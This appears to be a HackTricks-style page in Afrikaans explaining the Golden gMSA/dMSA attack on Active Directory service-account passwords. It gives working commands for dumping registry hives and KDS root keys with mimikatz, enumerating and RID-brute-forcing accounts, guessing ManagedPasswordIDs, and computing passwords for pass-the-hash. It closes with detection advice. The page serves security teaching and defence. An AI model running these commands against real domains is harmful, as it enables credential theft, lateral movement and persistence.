# Golden gMSA/dMSA Attack (Offline-afleiding van Managed Service Account-wagwoorde)

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Windows Managed Service Accounts (MSA) is spesiale principals wat ontwerp is om dienste te laat loop sonder dat hulle wagwoorde handmatig bestuur moet word.
Daar is twee hoofvariante:

1. **gMSA** – group Managed Service Account – kan op verskeie hosts gebruik word wat in sy `msDS-GroupMSAMembership`-attribuut gemagtig is.
2. **dMSA** – delegated Managed Service Account – die (preview)-opvolger van gMSA, wat op dieselfde kriptografie staatmaak, maar meer fynmazige delegeringscenario's moontlik maak.

Vir beide variante word die **wagwoord nie** op elke Domain Controller (DC) soos 'n gewone NT-hash gestoor nie. In plaas daarvan kan elke DC die huidige wagwoord on-the-fly aflei uit:

* Die forest-wye **KDS Root Key** (`KRBTGT\KDS`) – 'n ewekansig gegenereerde GUID-benoemde geheim, wat na elke DC gerepliseer word onder die `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`-container.
* Die teikenaccount se **SID**.
* 'n Per-account **ManagedPasswordID** (GUID) wat in die `msDS-ManagedPasswordId`-attribuut gevind word.

Die afleiding is: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240-grepe blob wat uiteindelik **base64-geënkodeer** en in die `msDS-ManagedPassword`-attribuut gestoor word.
Geen Kerberos-verkeer of domeininteraksie word tydens normale wagwoordgebruik vereis nie – 'n member host lei die wagwoord plaaslik af solank dit die drie insette ken.

## Golden gMSA / Golden dMSA Attack

As 'n aanvaller al drie insette **offline** kan bekom, kan hulle **geldige huidige en toekomstige wagwoorde** vir **enige gMSA/dMSA in die forest** bereken sonder om weer aan die DC te raak, en die volgende omseil:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP-read auditing
* Wagwoordveranderingsintervalle (hulle kan dit vooraf bereken)

Dit is analoog aan 'n *Golden Ticket* vir service accounts.<sup>[[1]](#references)[[2]](#references)</sup>

### Voorvereistes

1. **Forest-vlak kompromie** van **een DC** (of Enterprise Admin), of `SYSTEM`-toegang tot een van die DC's in die forest.
2. Vermoë om service accounts te enumerate (LDAP read / RID brute-force).
3. .NET ≥ 4.7.2 x64-werkstasie om [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) of ekwivalente kode uit te voer.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Fase 1 – Extract the KDS Root Key

Dump vanaf enige DC (Volume Shadow Copy / rou SAM+SECURITY-hives of remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Die base64-string gemerk as `RootKey` (GUID-naam) word in latere stappe benodig.<sup>[[1]](#references)[[2]](#references)</sup>

##### Fase 2 – Enumerateer gMSA / dMSA-objekte

Verkry ten minste `sAMAccountName`, `objectSid` en `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementeer hulpmodusse:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Fase 3 – Raai / Ontdek die ManagedPasswordID (wanneer dit ontbreek)

Sommige deployments *verwyder* `msDS-ManagedPasswordId` uit ACL-protected reads.
Omdat die GUID 128-bit is, is naive bruteforce onuitvoerbaar, maar:

1. Die eerste **32 bits = Unix epoch time** van die account se skepping (minute-resolusie).
2. Daarna volg 96 random bits.

Daarom is ’n **narrow wordlist per account** (± ’n paar uur) realisties.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Die hulpmiddel bereken kandidaatwagwoorde en vergelyk hul base64 blob met die werklike `msDS-ManagedPassword`-attribuut – die passing onthul die korrekte GUID.

##### Fase 4 – Offline-wagwoordberekening en -omskakeling

Sodra die ManagedPasswordID bekend is, is die geldige wagwoord net een opdrag ver:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Die resulterende hashes kan met **mimikatz** (`sekurlsa::pth`) of **Rubeus** vir Kerberos-abuse ingevoeg word, wat stealth **laterale beweging** en **volharding** moontlik maak.

## Opsporing en versagting

* Beperk **DC-rugsteun- en registerhive-lees**-vermoëns tot Tier-0-administrateurs.
* Monitor **Directory Services Restore Mode (DSRM)**- of **Volume Shadow Copy**-skepping op DC's.
* Ouditeer leesbewerkings / veranderinge aan `CN=Master Root Keys,…` en `userAccountControl`-vlae van diensrekeninge.
* Bespeur ongewone **base64-wagwoordskrywings** of skielike hergebruik van dienswagwoorde oor gashere heen.
* Oorweeg dit om hoëvoorreg-gMSAs na **classic service accounts** om te skakel, met gereelde ewekansige rotasies waar Tier-0-isolasie nie moontlik is nie.

## Gereedskap

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – verwysingsimplementering wat op hierdie bladsy gebruik word.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – verwysingsimplementering wat op hierdie bladsy gebruik word.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket met behulp van afgeleide AES-sleutels.

## Verwysings

- [1] [Golden dMSA – verifikasie-omseiling vir gedelegeerde Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub-bewaarplek](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
